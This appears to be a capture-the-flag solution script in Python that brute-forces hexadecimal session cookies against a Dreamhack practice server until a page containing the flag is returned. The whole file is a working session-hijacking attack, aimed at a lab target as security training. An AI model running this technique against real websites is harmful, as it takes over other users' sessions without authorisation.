import requests

port = 14477
url_index = f"http://host3.dreamhack.games:{port}/"

num = 0
cookie = {"sessionid": hex(num)[2:]}
r = requests.get(url_index, cookies=cookie)

while "flag" not in r.text:
    num += 1
    cookie = {"sessionid": hex(num)[2:]}
    print(num, cookie)
    r = requests.get(url_index, cookies=cookie)


print(r.text)
